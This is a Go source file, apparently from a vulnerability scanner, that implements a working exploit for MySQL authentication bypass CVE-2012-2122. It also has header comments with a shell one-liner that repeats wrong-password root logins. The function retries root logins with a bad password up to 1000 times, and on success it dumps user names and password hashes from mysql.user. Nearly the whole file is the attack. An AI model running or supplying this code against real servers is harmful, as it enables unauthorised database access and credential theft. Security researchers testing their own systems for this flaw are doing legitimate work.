// https://github.com/Avinza/CVE-2012-2122-scanner/blob/master/scan.php
// https://github.com/cyberharsh/Oracle-mysql-CVE-2012-2122
// for i in `seq 1 1000`; do mysql -uroot -pwrong -h your-ip -P3306 ; done

package mysql

import (
	"database/sql"
	"fmt"
	_ "github.com/go-sql-driver/mysql"
	"log"
	"strconv"
)

func CVE_2012_2122(ip string, port int) bool {
	for i := 1; i <= 1000; i++ {
		db, err := sql.Open("mysql", "root:wrong@tcp("+ip+":"+strconv.Itoa(port)+")/")
		if err != nil {
			fmt.Printf("Failed to connect to MySQL: %s\n", err)
			continue
		}
		defer db.Close()

		err = db.Ping()
		if err != nil {
			fmt.Printf("Failed to ping MySQL server: %s\n", err)
			continue
		}

		fmt.Printf("Successfully logged in to MySQL server - Attempt %d\n", i)

		rows, err := db.Query("SELECT user, password FROM mysql.user")
		if rows != nil {
			for rows.Next() {
				var user, password string
				err := rows.Scan(&user, &password)
				if err != nil {
					log.Printf("Failed to scan row: %v", err)
					continue
				}

				fmt.Printf("User: %s, Password: %s\n", user, password)
			}
		}
		return true
	}
	return false

}
